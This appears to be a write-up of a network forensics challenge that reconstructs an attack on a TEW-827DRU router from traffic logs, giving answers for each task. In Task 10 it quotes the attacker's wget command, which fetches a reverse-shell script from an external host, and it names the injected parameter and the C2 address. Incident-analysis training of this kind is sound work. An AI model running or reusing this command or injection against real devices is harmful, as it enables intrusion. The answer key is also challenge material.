

---

#### Sherlock Scenario

The SOC team has identified suspicious lateral movement targeting router firmware from within the network. Anomalous traffic patterns and command execution have been detected on the router, indicating that an attacker already inside the network has gained unauthorized access and is attempting further exploitation.

You will be given network traffic logs from one of the impacted machines. Your task is to conduct a thorough investigation to unravel the attacker's Techniques, Tactics, and Procedures (TTPs).



----

Task 1

From what IP address did the attacker initially launched their activity?

```
192.168.10.2
```



Filter for HTTP and we see 192.168.10.2 interacting with router
<img width="1605" height="219" alt="image" src="https://github.com/user-attachments/assets/03c1e3db-a3a1-4b3a-8493-335c235c8d2f" />





Task 2

What is the model name of the compromised router?

```
TEW-827DRU
```



Filter for the HTTP stream IN Q1 
<img width="2136" height="886" alt="image" src="https://github.com/user-attachments/assets/7457c8fd-2b51-4bca-98ec-42ecd795325e" />





Task 3

How many failed login attempts did the attacker try before successfully logging into the router?

```
2
```





Filter for the two IP´s and HTTP. Then calculate the POST requests before we see Router panel content being loaded
```
ip.src == 192.168.10.2 and ip.dst == 192.168.10.1 and http
```
<img width="3517" height="945" alt="image" src="https://github.com/user-attachments/assets/12ea669f-c65b-40e3-98a1-115e62301dd9" />













Task 4

At what UTC time did the attacker successfully log into the routers web admin interface?

```
2024-05-01 15:53:27
```



Check the packet details of the latest POST request before TA got a successful login
<img width="1903" height="1468" alt="image" src="https://github.com/user-attachments/assets/777ed076-9c61-4326-b317-f1cbf0de51e3" />






Task 5

How many characters long was the password used to log in successfully?

```
0
```



<img width="1861" height="381" alt="image" src="https://github.com/user-attachments/assets/50c7fdd4-68d1-4797-94eb-f811e8accd80" />











Task 6

What is the current firmware version installed on the compromised router?


```
2.1
```



Follow the stream of /adm_status.asp and search for ver
<img width="1773" height="949" alt="image" src="https://github.com/user-attachments/assets/26893d58-ebb8-4346-92b8-aec154d55a59" />









Task 7

Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?


```
usbapps.config.smb_admin_name
```




Since we know the version number of the app, we can search for the relevant vulnerability to predict where to look next

https://nvd.nist.gov/vuln/detail/CVE-2024-28353
This tells us what to look for

<img width="1892" height="948" alt="image" src="https://github.com/user-attachments/assets/1b201704-f551-43b0-8bac-172ba2facdde" />











Task 8


What is the CVE number associated with the vulnerability that was exploited in this attack?


```
CVE-2024-28353
```



https://nvd.nist.gov/vuln/detail/CVE-2024-28353










Task 9

What was the first command the attacker executed by exploiting the vulnerability?


```
whoami
```


<img width="1892" height="948" alt="image" src="https://github.com/user-attachments/assets/e8b8e36b-8e35-46e9-9258-68c12dc168ec" />











Task 10

What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?


```
wget http://35.159.25.253:8000/a1l4m.sh
```


Keep following the POST requests
<img width="1819" height="1180" alt="image" src="https://github.com/user-attachments/assets/b2c22e57-4844-46c0-9bf5-571f7061e601" />











Task 11

Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?

```
Access to this resource is forbidden
```





Find the POST request followed by an error
<img width="2461" height="770" alt="image" src="https://github.com/user-attachments/assets/96b88755-b2f9-4078-8454-f8243ed68c2c" />


Then follow it
<img width="2560" height="746" alt="image" src="https://github.com/user-attachments/assets/0922cc79-fb31-480e-803a-16bb061dd8ea" />












Task 12

What was the IP address and port number of the command and control (C2) server when the actor's reverse shell eventually did connect? (IP:Port)


```
35.159.25.253:41143
```


export the script the TA transferred and read it
<img width="1784" height="690" alt="image" src="https://github.com/user-attachments/assets/039acd0b-2102-4eff-bc57-0d1ec4c0721d" />


<img width="639" height="109" alt="image" src="https://github.com/user-attachments/assets/da8f21a4-4329-4fef-8724-16e83ee33517" />
